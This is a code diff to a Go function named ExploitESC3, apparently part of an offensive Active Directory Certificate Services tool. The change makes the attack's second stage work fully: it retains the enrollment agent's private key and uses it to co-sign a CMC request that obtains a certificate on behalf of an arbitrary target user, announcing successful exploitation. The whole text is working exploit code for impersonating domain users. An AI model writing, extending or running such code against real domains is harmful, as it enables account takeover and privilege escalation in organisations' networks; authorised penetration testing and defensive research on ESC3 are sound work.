@@ -97,7 +97,7 @@ func ExploitESC3(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 	// The agent cert uses the attacker's identity and the Certificate Request Agent EKU.
 	fmt.Println("[*] Stage 1: Enrolling for enrollment agent certificate...")
 	agentUPN := cfg.Username + "@" + cfg.Domain
-	agentCert, _, err := EnrollCertificate(cfg, templateName, agentUPN, false)
+	agentCert, agentKey, err := EnrollCertificate(cfg, templateName, agentUPN, false)
 	if err != nil {
 		return nil, nil, fmt.Errorf("enroll agent cert: %w", err)
 	}
@@ -105,21 +105,17 @@ func ExploitESC3(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 	fmt.Printf("[+] Stage 1 complete: enrollment agent certificate obtained for %s\n", agentUPN)
 	fmt.Printf("[*] Agent cert serial: %s\n", agentCert.SerialNumber.String())
 
-	// Stage 2: Use the enrollment agent cert to enroll for a certificate for the target UPN.
-	// NOTE: The full two-stage ESC3 attack requires CMC enrollment agent co-signing,
-	// which is only supported via the MS-WCCE RPC interface (ICertRequestD2::Request2),
-	// not via HTTP web enrollment (/certsrv/). For HTTP enrollment, we enroll directly
-	// for the target UPN — this works when combined with a template that allows
-	// enrollment agent-based enrollment. If the CA requires the agent co-signature
-	// via RPC, this stage will fail with the fallback self-signed cert.
-	fmt.Println("[*] Stage 2: Enrolling for certificate on behalf of target user...")
-	fmt.Println("[*] NOTE: Full CMC co-signing requires RPC enrollment (ICertRequestD2)")
-	cert, certKey, err := EnrollCertificate(cfg, templateName, targetUPN, false)
+	// Stage 2: Use the enrollment agent cert to enroll on behalf of the target.
+	// The CSR is wrapped in CMS SignedData co-signed by the agent certificate,
+	// then submitted via RPC with CR_IN_CMC flags. The CA validates the agent's
+	// Certificate Request Agent EKU to authorize on-behalf-of enrollment.
+	fmt.Println("[*] Stage 2: CMC co-signing — enrolling on behalf of target user...")
+	cert, certKey, err := EnrollCertificateOnBehalf(cfg, templateName, targetUPN, agentCert, agentKey)
 	if err != nil {
-		return nil, nil, fmt.Errorf("enroll target cert via agent: %w", err)
+		return nil, nil, fmt.Errorf("CMC enrollment on behalf of %s: %w", targetUPN, err)
 	}
 
-	fmt.Printf("[+] Stage 2 complete: certificate obtained for %s via enrollment agent\n", targetUPN)
+	fmt.Printf("[+] Stage 2 complete: certificate obtained for %s via CMC co-signing\n", targetUPN)
 	fmt.Printf("[+] ESC3 exploitation successful — two-stage enrollment agent attack\n")
 	return cert, certKey, nil
 }
